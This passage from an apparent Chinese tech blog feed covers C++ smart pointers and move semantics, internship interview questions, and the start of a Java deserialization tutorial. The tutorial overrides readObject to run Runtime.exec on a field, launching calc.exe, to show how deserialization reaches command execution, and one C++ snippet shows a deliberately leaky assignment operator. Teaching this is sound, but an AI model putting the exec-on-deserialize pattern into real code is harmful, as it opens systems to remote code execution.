class="line">vec.push_back(<span class="built_in">std</span>::move(ptr)); <span class="comment">// 转移所有权，ptr 变为空</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!ptr) &#123;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;ptr 已经为空&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>想象你在管理家具：</p><ul><li><p><strong><code>std::unique_ptr</code></strong> ：</p><ul><li>家具只能由一个人拥有（独占所有权）。</li><li>如果你想把家具给别人，必须完全转让所有权（<code>std::move</code>）。</li><li>你不能同时拥有两份相同的家具。</li></ul></li><li><p><strong><code>std::shared_ptr</code></strong> ：</p><ul><li>家具可以被多人共享（引用计数）。</li><li>每个人都有一份家具的“钥匙”，只有当所有人都归还钥匙时，家具才会被销毁。</li></ul></li></ul><ol start="2"><li>std::shared_ptr</li></ol><p>其实就是这个指针能被多个对象引用了。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">auto</span> ptr1 = <span class="built_in">std</span>::make_shared&lt;<span class="type">int</span>&gt;(<span class="number">100</span>); <span class="comment">// 引用计数为1</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">auto</span> ptr2 = ptr1; <span class="comment">// 引用计数增至2</span></span><br><span class="line">&#125; <span class="comment">// ptr2析构，引用计数减至1</span></span><br></pre></td></tr></table></figure><ol start="3"><li>std::weak_ptr</li></ol><p>多个对象引用但是不计数，做一个临时访问。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">auto</span> shared = <span class="built_in">std</span>::make_shared&lt;<span class="type">int</span>&gt;(<span class="number">200</span>);</span><br><span class="line"><span class="built_in">std</span>::weak_ptr&lt;<span class="type">int</span>&gt; weak = shared;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">auto</span> temp = weak.lock()) &#123; <span class="comment">// 检查资源是否存在</span></span><br><span class="line">    <span class="comment">// 使用temp访问资源</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="3-2-模板函数"><a href="#3-2-模板函数" class="headerlink" title="3.2 模板函数"></a>3.2 模板函数</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">template &lt;typename T&gt;</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 定义模板函数</span></span><br><span class="line">template &lt;typename T&gt;</span><br><span class="line"><span class="type">void</span> <span class="title function_">print</span><span class="params">(<span class="type">const</span> T&amp; value)</span> &#123;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Value: &quot;</span> &lt;&lt; value &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">int</span> i = <span class="number">42</span>;</span><br><span class="line">    <span class="type">double</span> d = <span class="number">3.14</span>;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">string</span> s = <span class="string">&quot;Hello, Template!&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 调用模板函数</span></span><br><span class="line">    print(i);   <span class="comment">// Value: 42</span></span><br><span class="line">    print(d);   <span class="comment">// Value: 3.14</span></span><br><span class="line">    print(s);   <span class="comment">// Value: Hello, Template!</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="3-3-引用和指针"><a href="#3-3-引用和指针" class="headerlink" title="3.3 引用和指针"></a>3.3 引用和指针</h3><p>为了更好地理解 <code>T &amp;ptr</code> 的作用，我们需要明确引用和指针的区别：</p><table><thead><tr><th>特性</th><th>引用 (<code>T&amp;</code>)</th><th>指针 (<code>T*</code>)</th></tr></thead><tbody><tr><td>是否可以为空</td><td>不可以为空（必须绑定到有效变量）</td><td>可以为空</td></tr><tr><td>是否需要解引用</td><td>不需要解引用</td><td>需要通过<code>*</code>解引用</td></tr><tr><td>是否可重新赋值</td><td>一旦绑定，不能重新绑定到其他变量</td><td>可以随时指向不同的地址</td></tr><tr><td>是否占用额外内存</td><td>通常不占用额外内存（编译器优化）</td><td>占用内存（存储地址）</td></tr></tbody></table><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">        <span class="keyword">if</span> (ptr)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">memset</span>(ptr, <span class="number">0x00</span>, <span class="keyword">sizeof</span>(T));</span><br><span class="line">            delete[] ptr;</span><br><span class="line">            ptr = nullptr; <span class="comment">// 避免悬空指针</span></span><br><span class="line">        &#125;</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">这里面有个很重要的观点，delete 只是清理了内存但是指针指向的内存并没有清理。</span></span><br><span class="line"><span class="comment">于是我们还需要将指针置空 </span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="3-4-移动构造函数"><a href="#3-4-移动构造函数" class="headerlink" title="3.4 移动构造函数"></a>3.4 移动构造函数</h3><p>我现在发现，其实移动构造函数就是把浅拷贝的构造函数加上把那个赋值的对象的属性放置为空。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">    SecureBuffer(SecureBuffer &amp;&amp;other) noexcept : m_data(other.m_data), m_size(other.m_size)</span><br><span class="line"></span><br><span class="line">    &#123;</span><br><span class="line"></span><br><span class="line">        other.m_data = nullptr; <span class="comment">// 避免悬空指针</span></span><br><span class="line"></span><br><span class="line">        other.m_size = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">        <span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;移动构造函数被调用&quot;</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  </span><br></pre></td></tr></table></figure><ol><li>noexcept</li></ol><p>不抛出异常处理，因为std:move std:vector 进行处理时候如果抛出异常之后，我们会造成移动拷贝失败，会退回到拷贝操作。影响效率</p><ol start="2"><li>SecureBuffer &amp;&amp;other</li></ol><p><code>&amp;&amp;</code> 是 C++11 引入的一个特性，表示 <strong>右值引用（Rvalue Reference）</strong> 。它专门用于绑定到临时对象或即将被销毁的对象（即“右值”）。</p><ol start="3"><li>左值必须转换成右值</li></ol><p>因为不转换那么c++ 默认是拷贝构造函数调用</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">SecureBuffer <span class="title function_">buf1</span><span class="params">(<span class="number">100</span>)</span>;                  <span class="comment">// buf1 是左值</span></span><br><span class="line">SecureBuffer buf2 = <span class="built_in">std</span>::move(buf1);    <span class="comment">// 使用 std::move 触发移动构造函数</span></span><br></pre></td></tr></table></figure><p>从这些分析中我们也可以看到，我们的移动赋值操作其实跟浅拷贝操作是一样的。但是移动拷贝是移动资源。</p><h3 id="3-5-移动赋值运算符"><a href="#3-5-移动赋值运算符" class="headerlink" title="3.5 移动赋值运算符"></a>3.5 移动赋值运算符</h3><p> 如果说深拷贝的话，其实我们是没有为指针提前赋值的，直接把要拷贝的对象放在构造函数参数，所以不用释放，但是赋值运算符是提前有一个对象，所以要先把他释放再深入拷贝</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">SecureBuffer&amp; operator=(<span class="type">const</span> SecureBuffer&amp; other) &#123;</span><br><span class="line">    <span class="keyword">if</span> (this != &amp;other) &#123; <span class="comment">// 防止自赋值</span></span><br><span class="line">        <span class="comment">// delete[] buffer; // 忘记释放原有资源</span></span><br><span class="line">        buffer = new <span class="type">char</span>[other.size];</span><br><span class="line">        size = other.size;</span><br><span class="line">        <span class="built_in">memcpy</span>(buffer, other.buffer, size);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> *this;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>其实这个移动赋值运算符号，跟深拷贝很像，但是触发还是有区别</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">SecureBuffer <span class="title function_">buf1</span><span class="params">(<span class="number">100</span>)</span>;</span><br><span class="line">SecureBuffer <span class="title function_">buf2</span><span class="params">(<span class="number">50</span>)</span>;</span><br><span class="line">buf2 = <span class="built_in">std</span>::move(buf1); <span class="comment">// 调用移动赋值运算符</span></span><br></pre></td></tr></table></figure><p>必须是已经存在的对象，并且我我们发现必须右边是右值对象，如果不是那么会调用拷贝运算符</p><h3 id="3-6-容器"><a href="#3-6-容器" class="headerlink" title="3.6 容器"></a>3.6 容器</h3><p><strong>容器</strong> 是一种用于存储和管理多个元素的数据结构</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;vector&gt;</span></span></span><br><span class="line"><span class="built_in">std</span>::<span class="built_in">vector</span>&lt;<span class="type">int</span>&gt; vec = &#123;<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>&#125;; <span class="comment">// 动态数组</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="built_in">std</span>::<span class="built_in">vector</span>&lt;<span class="type">int</span>&gt; vec;</span><br><span class="line">vec.push_back(<span class="number">1</span>); <span class="comment">// 动态添加元素</span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> x = vec[<span class="number">0</span>]; <span class="comment">// 访问第一个元素</span></span><br></pre></td></tr></table></figure><p>其实我感觉跟python没啥区别 但就是更快</p>]]></content>
      
      
      <categories>
          
          <category> c/c++ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> c/c++ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>实习该反问什么?</title>
      <link href="/2025/02/21/%E5%AE%9E%E4%B9%A0%E8%AF%A5%E9%97%AE%E4%BB%80%E4%B9%88/"/>
      <url>/2025/02/21/%E5%AE%9E%E4%B9%A0%E8%AF%A5%E9%97%AE%E4%BB%80%E4%B9%88/</url>
      
        <content type="html"><![CDATA[<h4 id="1-工作时间"><a href="#1-工作时间" class="headerlink" title="1.工作时间"></a>1.工作时间</h4><ol><li><p>上下班时间分别是什么？</p></li><li><p>单休还是双休？</p></li><li><p>是否是弹性工作制？</p></li><li><p>实习生需要加班吗，如果加班是否有补贴？</p></li></ol><h4 id="2-工作内容"><a href="#2-工作内容" class="headerlink" title="2. 工作内容"></a>2. 工作内容</h4><ol start="5"><li><p>工作具体内容？</p></li><li><p>工作地点在哪里？</p></li><li><p>归属于哪个部门？</p></li><li><p>部门规模如何？</p></li><li><p>入职后是否有人带或培训？</p></li></ol><h4 id="3-实习协议"><a href="#3-实习协议" class="headerlink" title="3. 实习协议"></a>3. 实习协议</h4><p>实习协议一定要签！</p><h4 id="4-实习证明"><a href="#4-实习证明" class="headerlink" title="4. 实习证明"></a>4. 实习证明</h4><ol start="10"><li><p>实习结束公司会不会开具实习证明？</p></li><li><p>满多少个月可以开实习证？</p></li></ol><h4 id="5-薪资待遇"><a href="#5-薪资待遇" class="headerlink" title="5. 薪资待遇"></a>5. 薪资待遇</h4><ol><li><p>薪资数目和构成？</p></li><li><p>薪资后面是否有涨幅？</p></li><li><p>工资发放日期？</p></li><li><p>按天算还是月结？</p></li><li><p>请假如何算工资？</p></li><li><p>实习生有无餐补或房补？</p></li></ol><h4 id="6-转正"><a href="#6-转正" class="headerlink" title="6. 转正"></a>6. 转正</h4><ol start="18"><li><p>是否有转正名额？</p></li><li><p>转正标准是什么？</p></li></ol><h4 id="7-离职"><a href="#7-离职" class="headerlink" title="7. 离职"></a>7. 离职</h4><ol start="20"><li><p>提前离职需要走哪些流程？</p></li><li><p>有违约金等费用吗？</p></li></ol>]]></content>
      
      
      <categories>
          
          <category> 面经 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 面经 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>安全服务实习面经</title>
      <link href="/2025/02/14/%E5%AE%89%E5%85%A8%E6%9C%8D%E5%8A%A1%E5%AE%9E%E4%B9%A0%E9%9D%A2%E7%BB%8F/"/>
      <url>/2025/02/14/%E5%AE%89%E5%85%A8%E6%9C%8D%E5%8A%A1%E5%AE%9E%E4%B9%A0%E9%9D%A2%E7%BB%8F/</url>
      
        <content type="html"><![CDATA[<ol><li>自我介绍</li><li>现在大几? </li><li>现在有什么课? 课多吗?</li><li>讲一下挖到的漏洞? 挖漏洞 漏洞复现 </li><li>挖到最多的是什么漏洞</li><li>接口未授权你会怎么测试? </li><li>你有什么想问我的吗?</li></ol>]]></content>
      
      
      <categories>
          
          <category> 面经 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 面经 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>java反序列化</title>
      <link href="/2025/02/05/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
      <url>/2025/02/05/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/</url>
      
        <content type="html"><![CDATA[<h4 id="什么是序列化"><a href="#什么是序列化" class="headerlink" title="什么是序列化?"></a>什么是序列化?</h4><ul><li>Java序列化是指把Java对象转换为字节序列的过程；  </li><li>Java反序列化是指把字节序列恢复为Java对象的过程；</li></ul><p><strong>反序列化目的</strong></p><p>对象不只是存储在内存中，它还需要在传输网络中进行传输，并且保存起来之后下次再加载出来，这时候就需要序列化技术。Java的序列化技术就是把对象转换成一串由二进制字节组成的数组，然后将这二进制数据保存在磁盘或<br>传输网络。而后需要用到这对象时，磁盘或者网络接收者可以通过反序列化得到此对象，达到对象持久化的目的。</p><p><strong>反序列化条件：</strong></p><p>● 该类必须实现 java.io.Serializable 对象<br>● 该类的所有属性必须是可序列化的。如果有一个属性不是可序列化的，则该属性必须注明是短暂的<br>序列化过程</p><p><strong>序列化过程:</strong> </p><p>● 序列化：将 OutputStream 封装在 ObjectOutputStream 内，然后调用 writeObject 即可<br>● 反序列化：将 InputStream 封装在 ObjectInputStream 内，然后调用 readObject 即可  </p><p><strong>反序列化出错可能原因</strong> </p><p>● 序列化字节码中的 serialVersionUID(用于记录java序列化版本)在进行反序列化时，JVM 会把传来的字节流中的 serialVersionUID 与本地相应实体类的 serialVersionUID 进行比较，如果相同就认为是一致的，可以进行反序列化，否则就抛出序列化版本不一致的异常- InvalidCastException。</p><h4 id="ObjectOutputStream-与-ObjectInputStream类"><a href="#ObjectOutputStream-与-ObjectInputStream类" class="headerlink" title="ObjectOutputStream 与 ObjectInputStream类"></a>ObjectOutputStream 与 ObjectInputStream类</h4><h5 id="ObjectOutputStream"><a href="#ObjectOutputStream" class="headerlink" title="ObjectOutputStream"></a>ObjectOutputStream</h5><p>先创建一个java 被反序列化对象</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.com.serial;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Employee</span> <span class="keyword">implements</span> <span class="title class_">java</span>.io.Serializable&#123;  </span><br><span class="line">    <span class="keyword">private</span> String name;  </span><br><span class="line">    <span class="keyword">private</span> <span class="type">int</span>  old;  </span><br><span class="line">    <span class="comment">// 无法被反序列化属性  </span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">transient</span> <span class="type">int</span> address;  </span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Employee</span><span class="params">(String name,<span class="type">int</span> old)</span>&#123;  </span><br><span class="line">        <span class="built_in">this</span>.name=name;  </span><br><span class="line">        <span class="built_in">this</span>.old=old;  </span><br><span class="line">    &#125;  </span><br><span class="line">    <span class="meta">@Override</span>  </span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">toString</span><span class="params">()</span>&#123;  </span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Your name:&quot;</span>+<span class="built_in">this</span>.name+<span class="string">&quot;Your old:&quot;</span>+<span class="built_in">this</span>.old;  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>创建另外一个java文件进行对于这个类的对象做一个反序列化</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.com.serial;</span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">SerializeDemo</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        Employee test=<span class="keyword">new</span> <span class="title class_">Employee</span>(<span class="string">&quot;tom&quot;</span>,<span class="number">12</span>);</span><br><span class="line">        ObjectOutputStream output=<span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;d:/1.ser&quot;</span>));</span><br><span class="line">        output.writeObject(test);</span><br><span class="line">        System.out.println(test);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/k1t0111/blog/main/image/20241021201353.png" alt="image.png"></p><h5 id="FileOutputStream"><a href="#FileOutputStream" class="headerlink" title="FileOutputStream"></a>FileOutputStream</h5><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">FileOutputStream</span> <span class="variable">fos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;ser.txt&quot;</span>);</span><br><span class="line"><span class="type">String</span> <span class="variable">data</span> <span class="operator">=</span> <span class="string">&quot;Hello, World!&quot;</span>;</span><br><span class="line">fos.write(data.getBytes());</span><br><span class="line">fos.close();</span><br></pre></td></tr></table></figure><h5 id="ObjectInputStream类"><a href="#ObjectInputStream类" class="headerlink" title="ObjectInputStream类"></a>ObjectInputStream类</h5><p>如果能找到一个对象的class文件，我们可以进行反序列化操作，调用 ObjectInputStream 读取对象的 方法：打印结果：反序列化操作就是从二进制文件中提取对象</p><p>编写反序列化代码</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.com.serial;  </span><br><span class="line"><span class="keyword">import</span> java.io.*;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">SerializeDemo</span> &#123;  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception&#123;  </span><br><span class="line">        Employee test=<span class="keyword">new</span> <span class="title class_">Employee</span>(<span class="string">&quot;tom&quot;</span>,<span class="number">12</span>);  </span><br><span class="line">        ObjectOutputStream output=<span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;d:/1.ser&quot;</span>));  </span><br><span class="line">        output.writeObject(test);  </span><br><span class="line">        output.close();  </span><br><span class="line">        ObjectInputStream input=<span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(<span class="string">&quot;d:/1.ser&quot;</span>));  </span><br><span class="line">        <span class="type">Object</span> <span class="variable">NEW</span> <span class="operator">=</span>input.readObject();  </span><br><span class="line">        System.out.println(NEW);  </span><br><span class="line">  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="漏洞成因"><a href="#漏洞成因" class="headerlink" title="漏洞成因"></a>漏洞成因</h4><p>  了解漏洞成因之前，我们首先要了解的是readobject方法。我们知道创建一个ObjectInputStream类的对象可以直接调用readobject方法，但是在这个类中，readobject方法是没有被具体实现的。而且他还有一个defaultreadobject方法，那么问题就是既然这个readobject方法没有被实现，那我们为什么还能使用他进行反序列化操作?</p><p><strong>内部逻辑</strong></p><ul><li><p><strong>调用 <code>readObject</code> 方法</strong>：当你调用 <code>ObjectInputStream</code> 的 <code>readObject</code> 方法时，它会读取流中的数据，了解要反序列化的对象类型。</p></li><li><p><strong>内部逻辑</strong>：虽然你没有看到具体的实现，但 <code>ObjectInputStream</code> 具有内部机制来处理对象的创建和字段的恢复。这包括：</p><ul><li>创建对象实例。</li><li>读取对象的字段并根据需要恢复它们的状态。</li></ul></li><li><p><strong>反序列化过程</strong>：在这个过程中，Java 使用反射和其他机制来确保对象的状态被正确恢复。这样，即使 <code>readObject</code> 方法没有用户自定义的逻辑，它仍然可以执行必要的步骤来完成反序列化。</p></li></ul><p> 了解了这个原因，我们就可以了解另外一个，我们可以重写readobject方法，并且我们可以在带有标记接口Serializable 的类中进行重写，那么又有一个问题既然我们的这个readobject方法是采用内部逻辑的方式去实现反序列化，那我们重写了之后我们无法利用内部逻辑，此时我们就需要刚才提到的defaultreadobject方法，我们可以在这个方法执行默认的反序列化逻辑，恢复对象的非瞬态字段。同时我们可以自己加一些逻辑代码进去。这也是我们能够利用的关键。</p><p> 但是问题又来了? 既然带有标记接口Serializable的这个类，继承的接口没有readobject方法，我们为什么还能在这个继承了标记接口的类中重写readobject方法。</p><p><code>ObjectInputStream</code> 能找到你自定义的 <code>readObject</code> 方法是因为反序列化的过程是通过类的元信息（反射）来实现的。具体来说：</p><ol><li><p><strong>类的元信息</strong>：当你反序列化一个对象时，<code>ObjectInputStream</code> 会首先读取对象的类信息，包括类名和字段。</p></li><li><p><strong>查找方法</strong>：在获取到类的信息后，<code>ObjectInputStream</code> 会检查该类是否定义了一个私有的 <code>readObject</code> 方法。这个检查是通过反射进行的，Java 反射机制允许程序在运行时查询类的结构和方法。</p></li><li><p><strong>调用自定义方法</strong>：如果找到了这个自定义的 <code>readObject</code> 方法，<code>ObjectInputStream</code> 就会调用它，而不是执行默认的反序列化逻辑。这使得你可以在反序列化过程中添加自定义逻辑。</p></li></ol><p>重点是java的反射机制。[[反射机制]]</p><h5 id="实现"><a href="#实现" class="headerlink" title="实现"></a>实现</h5><p>  经过刚才的分析，我们大致已经了解了，反序列化我们为什么可以控制。就是因为java允许我们重写readobject这个方法。导致我们可以利用反射机制，在我们序列化的这个类的中找到对应的重写的readobject方法。从而执行我们的逻辑，但是要保证我们的readobject方法一定是private的。</p><p><strong>设置类</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.com.serial;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Employee</span> <span class="keyword">implements</span> <span class="title class_">java</span>.io.Serializable&#123;</span><br><span class="line">    <span class="keyword">private</span> String name;</span><br><span class="line">    <span class="keyword">private</span> <span class="type">int</span>  old;</span><br><span class="line">    <span class="comment">// 无法被反序列化属性</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">transient</span> <span class="type">int</span> address;</span><br><span class="line">    <span class="keyword">public</span> String cmd=<span class="string">&quot;calc.exe&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Employee</span><span class="params">(String name,<span class="type">int</span> old)</span>&#123;</span><br><span class="line">        <span class="built_in">this</span>.name=name;</span><br><span class="line">        <span class="built_in">this</span>.old=old;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">toString</span><span class="params">()</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Your name:&quot;</span>+<span class="built_in">this</span>.name+<span class="string">&quot;Your old:&quot;</span>+<span class="built_in">this</span>.old+<span class="string">&quot;cmd&quot;</span>+<span class="built_in">this</span>.cmd;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">readObject</span><span class="params">(ObjectInputStream stream)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        stream.defaultReadObject();</span><br><span class="line">        Runtime.getRuntime().exec(<span class="built_in">this</span>.cmd);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">﻿﻿</span><br></pre></td></tr></table></figure><p><strong>序列化和反序列化</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.com.serial;</span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">SerializeDemo</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span>  <span class="keyword">void</span> <span class="title function_">Serial</span><span class="params">(Object obj)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        ObjectOutputStream output=<span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;d:/1.ser&quot;</span>));</span><br><span class="line">        output.writeObject(obj);</span><br><span class="line">        output.close();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">Deserial</span><span 